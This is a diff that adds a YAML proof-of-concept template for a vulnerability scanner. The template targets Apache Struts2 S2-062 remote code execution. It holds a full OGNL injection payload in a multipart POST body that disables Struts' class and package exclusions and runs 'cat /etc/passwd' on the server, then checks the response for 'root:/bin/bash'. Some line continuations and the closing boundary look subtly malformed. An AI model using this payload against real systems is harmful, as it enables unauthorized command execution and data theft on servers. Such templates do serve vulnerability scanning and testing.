@@ -1,0 +1,29 @@
+name: poc-yaml-struts2-062-rce
+description: "成功执行命令cat /etc/passwd"
+alwaysExecute: true
+matchCount: 1
+rules:
+  - method: POST
+    path: /
+    headers:
+      Content-Type: 'multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF'
+      Cache-Control: 'max-age=0'
+    body: "\
+        ------WebKitFormBoundaryl7d1B1aGsV2wcZwF\r\n\
+        Content-Disposition: form-data; name=\"id\"\r\n\r\n\
+        %{\r\n\
+        (#request.map=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +\r\n\
+        (#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) +\r\n\
+        (#request.map2=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +\r\n\
+        (#request.map2.setBean(#request.get('map').get('context')) == true).toString().substring(0,0) +\r\n
+        (#request.map3=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +\r\n\
+        (#request.map3.setBean(#request.get('map2').get('memberAccess')) == true).toString().substring(0,0) +\r\n\
+        (#request.get('map3').put('excludedPackageNames',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +\r\n\
+        (#request.get('map3').put('excludedClasses',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +\r\n
+        (#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'cat /etc/passwd'}))\r\n
+        }\r\n\
+        ------WebKitFormBoundaryl7d1B1aGsV2wcZwF—
+        "
+    expression:
+      status: 200
+      body_all: ["root:/bin/bash"]
